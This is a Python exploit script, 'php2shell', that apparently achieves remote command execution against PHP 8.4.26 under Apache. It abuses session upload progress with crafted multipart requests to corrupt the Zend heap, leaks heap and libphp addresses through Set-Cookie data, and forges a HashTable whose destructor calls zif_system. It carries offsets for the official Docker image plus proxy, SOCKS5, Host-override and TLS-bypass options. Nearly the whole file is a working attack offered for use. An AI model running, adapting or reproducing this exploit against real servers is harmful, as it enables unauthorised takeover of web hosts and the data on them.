#!/usr/bin/env python3
from __future__ import annotations

import argparse
import os
import re
import socket
import ssl
import struct
import subprocess
import threading
import sys
import time
import urllib.parse
from collections import Counter

# Offsets for the lab build (PHP 8.4.26, Apache 2.4.68, Debian 12, gcc 12).
# They are relative to the libphp.so / Zend MM chunk base, so they do not
# depend on ASLR.  Rebuilds can shift them; pass --zif-offset/--dtor-offset.
ZIF_OFFSET = 0x43A870       # zif_system
DTOR_OFFSET = 0x613C50      # ZVAL_PTR_DTOR (zval_ptr_dtor)
HTDATA_OFFSET = 0x6E0D8     # live 167-byte string used as fake HashTable
MAX_CMD = 14                # 167-byte carrier - 0x98 header - NUL

# bookworm (official php:8.4.26-apache) calibration, measured on the image
BOOKWORM_STAGE1_N = 841
BOOKWORM_STAGE2_T = 406
BOOKWORM_STAGE2_V = 16
BOOKWORM_HTDATA_OFFSET = 0x690D8
BOOKWORM_STAGE3_PADS = [(31, 31)] * 6

SID = b"attacksessionid0001"
DEFAULT_CMD = "id>/out/p1"
_HERE = os.path.dirname(os.path.abspath(__file__))
DEFAULT_PROOF = os.path.join(_HERE, "out", "p1")
DEFAULT_OFFSETS = os.path.join(_HERE, "out", "offsets.env")


def build_multipart(parts, boundary: bytes) -> bytes:
    out = bytearray()
    for p in parts:
        name = p["name"].encode()
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + name + b'"'
        if p.get("filename") is not None:
            out += b'; filename="' + p["filename"].encode() + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + p["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def read_offsets_file(path: str) -> dict[str, int]:
    """Read ZIF_OFFSET=0x.. / DTOR_OFFSET=0x.. written by docker/offsets.py."""
    vals: dict[str, int] = {}
    if not path:
        return vals
    try:
        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                key, val = line.split("=", 1)
                vals[key.strip()] = int(val.strip(), 0)
    except (OSError, ValueError):
        pass
    return vals


# ---- Global request-layer defaults (injected by the CLI) ----
DEFAULT_PROXY = None      # e.g. http://127.0.0.1:8080 or socks5://u:p@127.0.0.1:1080
# When accessing by IP but the target vhost only accepts a domain, use this to override the Host header (common with public labs)
DEFAULT_HOST_HEADER = None
# True = skip certificate verification when accessing https targets (self-signed/expired-cert labs)
# Environment-variable fallback is supported so p2s_ext can pass --insecure through to child processes
DEFAULT_INSECURE = os.environ.get("PHP2SHELL_INSECURE", "") == "1"
DEFAULT_HEADERS = {}      # headers appended to every request, e.g. {"User-Agent": "my-research-scanner"}
DEFAULT_SOURCES = []      # local source address pool (only addresses configured on local NICs/loopback)
_SRC_IDX = [0]


def _create_conn(host: str, port: int, timeout: float, src=None):
    """Open a TCP connection; when src is non-empty, bind to the local source address.

    Note: bind() only succeeds for addresses **configured on this machine** (otherwise EADDRNOTAVAIL),
    so this capability is inherently limited to "source addresses you own" and cannot be used to anonymize third-party attacks.
    """
    if not src:
        return socket.create_connection((host, port), timeout=timeout)
    infos = socket.getaddrinfo(host, port, 0, socket.SOCK_STREAM)
    fam, typ, proto, _, sa = infos[0]
    s = socket.socket(fam, typ, proto)
    s.settimeout(timeout)
    try:
        s.bind((src, 0))
        s.connect(sa)
    except OSError:
        s.close()
        raise
    return s


def _socks5_handshake(s, host: str, port: int, user=None, pwd=None) -> None:
    """Minimal SOCKS5 CONNECT implementation (no auth / username-password auth)."""
    s.sendall(b"\x05\x02\x00\x02" if user else b"\x05\x01\x00")
    r = s.recv(2)
    if len(r) < 2 or r[0] != 5:
        raise OSError("socks5: bad greeting reply")
    if r[1] == 0x02:
        if not user:
            raise OSError("socks5: proxy requires username/password")
        u = user.encode()
        p = (pwd or "").encode()
        s.sendall(b"\x01" + bytes([len(u)]) + u + bytes([len(p)]) + p)
        r = s.recv(2)
        if len(r) < 2 or r[1] != 0:
            raise OSError("socks5: auth failed")
    elif r[1] != 0x00:
        raise OSError("socks5: no acceptable auth method (0x%02x)" % r[1])
    hb = host.encode()
    s.sendall(b"\x05\x01\x00\x03" + bytes([len(hb)]) + hb
              + port.to_bytes(2, "big"))
    r = s.recv(4)
    if len(r) < 4 or r[1] != 0:
        raise OSError("socks5: connect failed (rep=%s)" % (r[1] if len(r) > 1 else "?"))
    atyp = r[3]
    if atyp == 0x01:
        s.recv(4 + 2)
    elif atyp == 0x03:
        n = s.recv(1)[0]
        s.recv(n + 2)
    elif atyp == 0x04:
        s.recv(16 + 2)


class Target:
    def __init__(self, url: str, timeout: float = 30.0, verbose: bool = True,
                 proxy: str = None, headers: dict = None):
        u = urllib.parse.urlsplit(url)
        if u.scheme not in ("http", "https"):
            raise ValueError("URL must be http:// or https://")
        self.https = u.scheme == "https"
        self.host = u.hostname or "127.0.0.1"
        self.port = u.port or (443 if self.https else 80)
        self.path = u.path or "/"
        self.timeout = timeout
        self.verbose = verbose
        self.proxy = proxy if proxy is not None else DEFAULT_PROXY
        self.headers = dict(DEFAULT_HEADERS if headers is None else headers)

    def log(self, msg: str) -> None:
        if self.verbose:
            print(msg, flush=True)

    def _open_socket(self, tmo: float):
        """Connect directly, or through a single HTTP/SOCKS5 proxy to the target (for corporate egress/debugging)."""
        src = None
        if DEFAULT_SOURCES:
            src = DEFAULT_SOURCES[_SRC_IDX[0] % len(DEFAULT_SOURCES)]
            _SRC_IDX[0] += 1
        if not self.proxy:
            return _create_conn(self.host, self.port, tmo, src)
        pu = urllib.parse.urlsplit(self.proxy if "://" in self.proxy
                                   else "http://" + self.proxy)
        scheme = (pu.scheme or "http").lower()
        phost = pu.hostname or "127.0.0.1"
        pport = pu.port or (1080 if scheme.startswith("socks") else 8080)
        s = _create_conn(phost, pport, tmo, src)
        if scheme.startswith("socks"):
            _socks5_handshake(s, self.host, self.port, pu.username, pu.password)
            return s
        req = "CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\n" % (
            self.host, self.port, self.host, self.port)
        if pu.username:
            import base64 as _b64
            tok = _b64.b64encode(
                ("%s:%s" % (pu.username, pu.password or "")).encode()).decode()
            req += "Proxy-Authorization: Basic %s\r\n" % tok
        req += "Proxy-Connection: keep-alive\r\n\r\n"
        s.sendall(req.encode())
        buf = b""
        while b"\r\n\r\n" not in buf and len(buf) < 8192:
            chunk = s.recv(1024)
            if not chunk:
                break
            buf += chunk
        line = buf.split(b"\r\n", 1)[0].decode("latin-1", "replace")
        if " 200" not in line:
            try:
                s.close()
            except OSError:
                pass
            raise OSError("proxy CONNECT failed: %s" % line)
        return s

    def _connect(self):
        last = None
        for _ in range(10):
            try:
                s = self._open_socket(self.timeout)
                if self.https:
                    ctx = ssl.create_default_context()
                    if DEFAULT_INSECURE:
                        # Authorized lab with a self-signed/expired certificate: skip verification (off by default)
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=self.host)
                try:
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                except OSError:
                    pass
                return s
            except OSError as e:
                last = e
                time.sleep(0.3)
        raise last  # type: ignore[misc]

    def post(self, body: bytes, boundary: bytes, read_cap: int = 1 << 20,
             timeout: float | None = None,
             extra_headers: dict[str, str] | None = None) -> bytes:
        merged = dict(getattr(self, "headers", None) or {})
        merged.update(extra_headers or {})
        extra = ""
        for k, v in merged.items():
            extra += f"{k}: {v}\r\n"
        hdr = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {DEFAULT_HOST_HEADER or (self.host + ':' + str(self.port))}\r\n"
            f"{extra}"
            f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
            f"Content-Length: {len(body)}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode()
        s = self._connect()
        s.settimeout(timeout or self.timeout)

        # Read concurrently with the upload: some exploit requests make the
        # worker abort right after sending Set-Cookie, and a recv() that starts
        # after the RST loses the already-buffered response.
        data = bytearray()

        def _reader() -> None:
            try:
                while len(data) < read_cap:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    data.extend(chunk)
            except OSError:
                pass

        reader = threading.Thread(target=_reader, daemon=True)
        reader.start()
        try:
            try:
                s.sendall(hdr)
                mv = memoryview(body)
                for off in range(0, len(body), 262144):
                    s.sendall(mv[off:off + 262144])
            except OSError:
                pass  # the worker may abort while the body is still in flight
            reader.join(timeout=(timeout or self.timeout) + 1.0)
            return bytes(data)
        finally:
            s.close()

    def get(self, path: str, read_cap: int = 1 << 20) -> tuple[int, bytes]:
        hdr = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {DEFAULT_HOST_HEADER or (self.host + ':' + str(self.port))}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode()
        s = self._connect()
        s.settimeout(self.timeout)
        try:
            s.sendall(hdr)
            data = bytearray()
            try:
                while len(data) < read_cap:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    data += chunk
            except OSError:
                pass
        finally:
            s.close()
        head, _, body = bytes(data).partition(b"\r\n\r\n")
        m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
        return (int(m.group(1)) if m else 0), body


def parse_cookie(resp: bytes) -> bytes:
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    if not m:
        return b""
    return urllib.parse.unquote_to_bytes(m.group(1).decode("latin1"))


def chunk_base_from_cookie(raw: bytes) -> int:
    """Stage 1: 2MB-aligned mode of the heap pointers in the decoded cookie."""
    if len(raw) < 1000:
        return 0
    c: Counter[int] = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x7F0000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    if not c:
        return 0
    base, count = c.most_common(1)[0]
    return base if count >= 8 else 0


def libphp_base_from_cookie(raw: bytes, dtor_offset: int = DTOR_OFFSET) -> int:
    """Stage 2: Set-Cookie data starts at PS(id)+0x18 = nNextFreeElement|pDestructor.

    The page-aligned check is 4KB, not 2MB: the lab build happened to map
    libphp at a 2MB boundary, but the official php:8.4.26-apache image maps it
    at a 4KB boundary (e.g. base 0x...acdb000).
    """
    if len(raw) < 16:
        return 0
    p = int.from_bytes(raw[8:16], "little")
    if not (0x7F0000000000 <= p < 0x800000000000):
        return 0
    if p & 0xFFF != dtor_offset & 0xFFF:
        return 0
    base = p - dtor_offset
    return base if base & 0xFFF == 0 else 0


class Exploit:
    def __init__(self, target: Target, cmd: str, zif_offset: int = ZIF_OFFSET,
                 dtor_offset: int = DTOR_OFFSET, htdata_offset: int = HTDATA_OFFSET,
                 huge_mb: int = 12, verbose: bool = True, profile: str = "lab"):
        self.t = target
        self.cmd = cmd.encode()
        self.zif_offset = zif_offset
        self.dtor_offset = dtor_offset
        self.htdata_offset = htdata_offset
        self.huge_mb = huge_mb
        self.verbose = verbose
        self.profile = profile
        if profile == "bookworm":
            # official php:8.4.26-apache (Debian 12, Apache 2.4.69)
            self.stage1_n = BOOKWORM_STAGE1_N
            self.stage2_t = BOOKWORM_STAGE2_T
            self.stage2_v = BOOKWORM_STAGE2_V
            self.stage3_pads = list(BOOKWORM_STAGE3_PADS)
            self.stage3_carrier = True
        else:
            self.stage1_n = 892
            self.stage2_t = 443
            self.stage2_v = 1
            self.stage3_pads = [(8, 7)] + [(7, 7)] * 5
            self.stage3_carrier = False

    # ---------- request primitives (shapes match tools/*.py) ----------

    def _big_field(self) -> dict:
        return {"name": "big", "data": b"B" * (self.huge_mb * 1024 * 1024)}

    def _file_part(self) -> dict:
        return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

    def rotate(self) -> None:
        """Abort the current worker over HTTP; prefork forks a fresh one."""
        self.t.log("[*] rotating worker over HTTP")
        parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
        time.sleep(0.3)
        # Session-initializing B with no file part: pre-RINIT cleanup walks the
        # corrupted heap and the child aborts.
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        self.t.post(build_multipart(parts, b"BNDRY12345"), b"BNDRY12345",
                    read_cap=65536, timeout=20.0)
        time.sleep(0.5)

    def stage1(self) -> int:
        """Leak the Zend MM chunk base."""
        parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
        time.sleep(0.2)

        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for i in range(self.stage1_n):
            val = (f"v{i:04d}" + "x" * 44)[:48]
            parts.append({"name": str(1000 + i), "data": val.encode()})
        forge = bytearray(b"A" * 79)
        struct.pack_into("<Q", forge, 0x10, 0x1000)   # forged zend_string len
        forge[0x18] = ord("L")
        parts.append({"name": "1999", "data": bytes(forge)})

        resp = self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
                           read_cap=9 << 20)
        return chunk_base_from_cookie(parse_cookie(resp))

    def stage2(self) -> int:
        """Leak libphp base through a 56-byte HashTable page."""
        parts = [{"name": f"f{i:04d}"[:5], "data": b"x" * 39} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout))
        time.sleep(0.2)

        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for i in range(983):
            cnt = 16 if i == self.stage2_t else 1
            for j in range(cnt):
                parts.append({"name": f"a{i:04d}[{j}]", "data": b"x" * self.stage2_v})

        resp = self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
                           read_cap=1 << 20)
        return libphp_base_from_cookie(parse_cookie(resp), self.dtor_offset)

    def _fake_payload(self, htdata: int, zif: int) -> tuple[bytes, bytes]:
        cmd = self.cmd
        ht_size = int(getattr(self, "ht_size", 167))
        cap = ht_size - 0x98 - 1
        if len(cmd) > cap:
            raise ValueError(
                f"command is {len(cmd)} bytes, exceeding the fake struct capacity of {cap} bytes"
                f" (ht_size={ht_size}, capacity = ht_size - 0x98 - 1);"
                f" use a short command such as 'sh</out/c' to run an external script"
            )
        ht = bytearray(b"\x00" * ht_size)
        # fake HashTable
        struct.pack_into("<II", ht, 0x00, 1, 7)                 # gc: rc=1, IS_ARRAY
        struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)     # flags, nTableMask
        struct.pack_into("<Q", ht, 0x10, htdata + 0x20)         # arData
        struct.pack_into("<II", ht, 0x18, 1, 1)                 # nNumUsed/OfElements
        struct.pack_into("<II", ht, 0x20, 8, 0)                 # nTableSize/pointer
        struct.pack_into("<Q", ht, 0x28, 0)                     # nNextFreeElement
        struct.pack_into("<Q", ht, 0x30, zif)                   # pDestructor
        # fake execute_data at E = data+0x20
        E = 0x20
        struct.pack_into("<Q", ht, E + 0x00, 0)                 # opline
        struct.pack_into("<Q", ht, E + 0x08, 0)                 # call
        struct.pack_into("<Q", ht, E + 0x10, zif)               # return_value
        struct.pack_into("<Q", ht, E + 0x18, 0)                 # func
        struct.pack_into("<Q", ht, E + 0x20, 0)                 # This.value
        struct.pack_into("<I", ht, E + 0x28, 0)                 # This.u1.type_info
        struct.pack_into("<I", ht, E + 0x2C, 1)                 # num_args = 1
        struct.pack_into("<Q", ht, E + 0x30, 0)                 # prev_execute_data
        struct.pack_into("<Q", ht, E + 0x38, 0)                 # symbol_table
        struct.pack_into("<I", ht, E + 0x40, 0)                 # call_info
        struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)     # arg1 value
        struct.pack_into("<I", ht, E + 0x58, 6)                 # arg1 IS_STRING
        # fake zend_string at data+0x80
        struct.pack_into("<II", ht, 0x80, 1, 0x106)             # gc rc=1, IS_STRING
        struct.pack_into("<Q", ht, 0x88, 0)                     # h
        struct.pack_into("<Q", ht, 0x90, len(cmd))              # len
        ht[0x98:0x98 + len(cmd)] = cmd
        ht[0x98 + len(cmd)] = 0

        # fake reference (55 bytes) placed at R0-0x10
        ref = bytearray(b"X" * 55)
        struct.pack_into("<II", ref, 0x10, 1, 10)               # IS_REFERENCE
        struct.pack_into("<Q", ref, 0x18, htdata)               # val.value
        struct.pack_into("<Q", ref, 0x20, 0x307)                # IS_ARRAY_EX
        struct.pack_into("<Q", ref, 0x28, 0)                    # sources
        return bytes(ht), bytes(ref)

    def stage3(self, htdata: int, zif: int) -> None:
        """Write the fake reference over PS(http_session_vars) and execute."""
        parts = [
            {"name": "PHPSESSID", "data": b"a" * 19},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
        ]
        specs = self.stage3_pads
        for i, (nl, vl) in enumerate(specs):
            name = (f"p{i:0{nl - 1}d}" if nl > 0 else "")[:nl]
            parts.append({"name": name, "data": b"V" * vl})
        parts += [self._file_part(), self._big_field()]
        extra = None
        if self.profile == "bookworm":
            # Keep PS(id) valid: php_session_initialize then leaves
            # send_cookie=0, so B's init does not allocate the Set-Cookie
            # header at R0+16 (which would clobber val.type).
            extra = {"Cookie": "PHPSESSID=" + "a" * 32}
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout),
                    extra_headers=extra)
        time.sleep(0.3)

        ht, ref = self._fake_payload(htdata, zif)
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        if self.stage3_carrier:
            # The bookworm reference is still alive (rc=2).  A 15-byte
            # bin-40 zend_string lands its chars exactly at
            # PS(http_session_vars): keep gc (rc=1, IS_REFERENCE), rewrite the
            # low 7 bytes of val.value to the fake HashTable, and let the
            # high byte stay 0x00 (canonical 0x00007f... pointer).
            carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
            for i in range(2):
                parts.append({"name": f"f{i:02d}", "data": b"F" * 15})
            parts.append({"name": "g00", "data": carrier})
            for i in range(15):
                parts.append({"name": f"a{i:030d}"[:31], "data": ht})
        else:
            for i in range(15):
                parts.append({"name": f"a{i:030d}"[:31], "data": ht})
            for i in range(2):
                parts.append({"name": f"f{i:02d}", "data": ref})
        self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
                    read_cap=65536, timeout=30.0)


def main() -> int:
    ap = argparse.ArgumentParser(
        description="php2shell one-click exploit (official php:8.4.26-apache / lab)",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    ap.add_argument("-u", "--url", required=True,
                    help="target PHP page, e.g. http://127.0.0.1:8088/index.php")
    ap.add_argument("-c", "--cmd", default=DEFAULT_CMD,
                    help=f"command to execute (max {MAX_CMD} bytes)")
    ap.add_argument("--proof-file", default=DEFAULT_PROOF,
                    help="read this local file after exploitation; '' disables")
    ap.add_argument("--fetch", default="",
                    help="GET this path afterwards (for commands writing to webroot)")
    ap.add_argument("--zif-offset", type=lambda x: int(x, 0), default=None,
                    help=f"offset of zif_system in libphp.so (default: offsets file or 0x{ZIF_OFFSET:x})")
    ap.add_argument("--dtor-offset", type=lambda x: int(x, 0), default=None,
                    help=f"offset of ZVAL_PTR_DTOR in libphp.so (default: offsets file or 0x{DTOR_OFFSET:x})")
    ap.add_argument("--profile", choices=("lab", "bookworm"), default="bookworm",
                    help="target build profile: bookworm (official image, default) or lab (Apache 2.4.68)")
    ap.add_argument("--htdata-offset", type=lambda x: int(x, 0), default=None,
                    help="chunk-relative offset of the 167-byte live string")
    ap.add_argument("--offsets-file", default=DEFAULT_OFFSETS,
                    help="read libphp offsets from this file ('' to disable)")
    ap.add_argument("--docker-container", default="php2shell-target",
                    help="container used to auto-derive offsets on localhost")
    ap.add_argument("--no-auto-offsets", action="store_true",
                    help="never run docker/offsets.py automatically")
    ap.add_argument("--huge-mb", type=int, default=12,
                    help="size of the OOM field; must exceed memory_limit")
    ap.add_argument("--timeout", type=float, default=30.0, help="per-request timeout")
    ap.add_argument("--no-pre-rotate", action="store_true",
                    help="skip the initial worker rotation")
    ap.add_argument("--no-retry-rotate", action="store_true",
                    help="do not rotate between failed stage attempts")
    ap.add_argument("--retries", type=int, default=3,
                    help="attempts per leak stage; stage 3 uses retries+2")
    ap.add_argument("-q", "--quiet", action="store_true")
    args = ap.parse_args()

    if len(args.cmd.encode()) > MAX_CMD:
        ap.error(f"--cmd is limited to {MAX_CMD} bytes by the 167-byte carrier")

    if args.htdata_offset is None:
        args.htdata_offset = (BOOKWORM_HTDATA_OFFSET if args.profile == "bookworm"
                              else HTDATA_OFFSET)

    local_offsets = read_offsets_file(args.offsets_file)
    t = Target(args.url, timeout=args.timeout, verbose=not args.quiet)

    # A local docker target may be built from a different image/toolchain than
    # the lab; ask the container for its real libphp offsets once.
    if (not local_offsets and not args.no_auto_offsets and args.offsets_file
            and t.host in ("127.0.0.1", "localhost", "::1")):
        helper = os.path.join(_HERE, "docker", "offsets.py")
        if os.path.exists(helper):
            if not args.quiet:
                print("[*] no offsets file; reading libphp symbols from "
                      f"container {args.docker_container}", flush=True)
            try:
                subprocess.run(
                    [sys.executable, helper, args.docker_container, args.offsets_file],
                    check=False, timeout=60,
                    stdout=None if not args.quiet else subprocess.DEVNULL,
                    stderr=None if not args.quiet else subprocess.DEVNULL,
                )
            except (OSError, subprocess.SubprocessError):
                pass
            local_offsets = read_offsets_file(args.offsets_file)

    if args.zif_offset is None:
        args.zif_offset = local_offsets.get("ZIF_OFFSET", ZIF_OFFSET)
    if args.dtor_offset is None:
        args.dtor_offset = local_offsets.get("DTOR_OFFSET", DTOR_OFFSET)

    ex = Exploit(t, args.cmd, zif_offset=args.zif_offset,
                 dtor_offset=args.dtor_offset, htdata_offset=args.htdata_offset,
                 huge_mb=args.huge_mb, verbose=not args.quiet, profile=args.profile)
    t.log(f"[*] target {args.url} (cmd={args.cmd!r})")
    if local_offsets:
        t.log(f"[*] offsets loaded from {args.offsets_file}")
    t.log(f"[*] offsets: zif=0x{args.zif_offset:x} dtor=0x{args.dtor_offset:x} "
          f"htdata=0x{args.htdata_offset:x}")

    def rotate_after_failure() -> None:
        if not args.no_retry_rotate:
            ex.rotate()

    if not args.no_pre_rotate:
        ex.rotate()

    # ---- stage 1 ----
    chunk = 0
    for attempt in range(1, args.retries + 1):
        t.log(f"[*] stage 1: heap leak (attempt {attempt}/{args.retries})")
        chunk = ex.stage1()
        if chunk:
            t.log(f"[+] chunk base = 0x{chunk:x}")
            break
        t.log("[-] heap leak missed")
        rotate_after_failure()
    if not chunk:
        print("HEAP_LEAK_FAILED", file=sys.stderr)
        return 1
    ex.rotate()  # each stage needs a fresh worker

    # ---- stage 2 ----
    libphp = 0
    for attempt in range(1, args.retries + 1):
        t.log(f"[*] stage 2: libphp leak (attempt {attempt}/{args.retries})")
        libphp = ex.stage2()
        if libphp:
            t.log(f"[+] libphp base = 0x{libphp:x}")
            break
        t.log("[-] libphp leak missed")
        rotate_after_failure()
    if not libphp:
        print("LIBPHP_LEAK_FAILED", file=sys.stderr)
        return 1
    ex.rotate()

    # ---- stage 3 ----
    htdata = chunk + args.htdata_offset
    zif = libphp + args.zif_offset
    t.log(f"[*] stage 3: HTDATA=0x{htdata:x} ZIF=0x{zif:x}")
    proof = ""
    if args.proof_file:
        try:
            if os.path.exists(args.proof_file):
                os.unlink(args.proof_file)
        except OSError:
            pass

    for attempt in range(1, args.retries + 3):
        try:
            ex.stage3(htdata, zif)
        except OSError as e:
            t.log(f"[-] request error: {e}")
        time.sleep(0.8)

        if args.proof_file:
            try:
                if os.path.exists(args.proof_file):
                    with open(args.proof_file, "rb") as f:
                        proof = f.read().decode("latin1").strip()
            except OSError:
                pass
        if not proof and args.fetch:
            status, body = t.get(args.fetch)
            if status == 200:
                proof = body.decode("latin1").strip()
        if proof:
            t.log(f"[+] W3 attempt {attempt}")
            print(f"PROOF: {proof}")
            return 0
        t.log(f"[-] stage 3 attempt {attempt} no proof yet")
        rotate_after_failure()

    print("EXPLOIT_FAILED (no proof; the command may still have executed blind)",
          file=sys.stderr)
    return 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
